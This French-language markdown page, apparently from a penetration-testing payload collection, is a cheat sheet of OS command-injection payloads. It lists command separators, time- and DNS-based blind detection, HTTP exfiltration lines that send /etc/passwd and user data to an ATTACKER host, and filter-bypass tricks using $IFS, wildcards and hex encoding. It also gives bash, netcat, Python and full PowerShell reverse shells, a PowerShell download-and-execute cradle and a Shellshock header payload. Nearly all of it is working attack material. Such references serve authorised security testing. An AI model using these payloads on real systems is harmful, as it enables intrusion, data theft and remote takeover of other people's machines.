# 💻 Charges utiles d’injection de commandes

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Command-Injection.tr.md) • [🇬🇷 Ελληνικά](Command-Injection.el.md)

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

> **Précisions de lecture :** Les séparateurs dépendent de l’interpréteur : la liste Windows mêle des formes propres à cmd.exe, à PowerShell ou à un décodage d’URL. Les accolades et /dev/tcp supposent aussi des capacités particulières du shell ; nc -e n’existe pas dans toutes les variantes. Les commandes sources sont conservées, sans garantie universelle de fonctionnement. Le lien de retour vise le README de Payloads, absent du dépôt source fourni ; aucun fichier de remplacement n’a été inventé.

---

## 🎯 Séparateurs de commandes

### Linux/Unix
```bash
;       # Point-virgule : exécuter ensuite
|       # Tube : transmettre la sortie à la commande suivante
||      # OU : exécuter si la première commande échoue
&       # Arrière-plan : exécuter en arrière-plan
&&      # ET : exécuter si la première commande réussit
`cmd`   # Accents graves : substitution de commande
$(cmd)  # Dollar : substitution de commande
\n      # Saut de ligne : séparer les commandes
```

### Windows
```cmd
;       # Fonctionne dans certains contextes
|       # Tube
||      # OU
&       # Exécuter les deux
&&      # ET
\n      # Saut de ligne
%0a     # Saut de ligne encodé pour une URL
```

---

## 💉 Charges utiles de base

### Test simple
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

### Encodage d’URL
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # saut de ligne + id
```

---

## 🔥 Injection de commandes à l’aveugle

### Détection par temporisation
```bash
# Commandes de temporisation
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

### Détection par DNS
```bash
# Avec nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# Avec curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

### Exfiltration par HTTP
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

## 🛡️ Techniques de contournement des filtres

### Contournement des espaces
```bash
# Avec $IFS (séparateur de champs interne)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Avec des tabulations
;cat	/etc/passwd

# Avec des accolades
{cat,/etc/passwd}
```

### Contournement des mots-clés
```bash
# Fragmentation des commandes
w'h'oami
w"h"oami
who$@ami
who\ami

# Avec des caractères génériques
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Avec des variables
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Encodage hexadécimal
echo -e "\x69\x64" | sh    # id
```

### Contournement des caractères spéciaux
```bash
# Avec différents délimiteurs
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Injection de saut de ligne
%0aid
%0Acat%20/etc/passwd

# Avec des commentaires
; id #
| id #
```

---

## 🐧 Charges utiles Linux

### Lecture de fichiers
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

### Exécution de commandes
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

### Shell inversé (reverse shell)
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

## 🪟 Charges utiles Windows

### Commandes de base
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

### Lecture de fichiers
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

### Shell inversé (reverse shell)
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 📝 Points d’injection courants

```
Paramètres d’URL :
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

Paramètres POST :
  filename=test.txt;id
  host=localhost|whoami

En-têtes :
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

Noms des fichiers téléversés :
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

## 📋 Liste de contrôle des tests

```markdown
□ Tester tous les séparateurs de commandes (; | || & && ` $())
□ Tester les versions encodées pour une URL
□ Tester l’injection aveugle par temporisation
□ Tester l’exfiltration DNS/HTTP
□ Tester le contournement des espaces ($IFS, tabulations, accolades)
□ Tester le contournement des mots-clés (guillemets, caractères génériques)
□ Tester l’injection de saut de ligne (%0a)
□ Rechercher les caractères filtrés
□ Essayer les commandes Linux et Windows
```

---

## 🔗 Charges utiles connexes

- [Charges utiles LFI](./LFI.fr.md)
- [Charges utiles SSTI](./SSTI.fr.md)

---

**Retour aux charges utiles :** [💉 Collection de charges utiles](../../README.md)
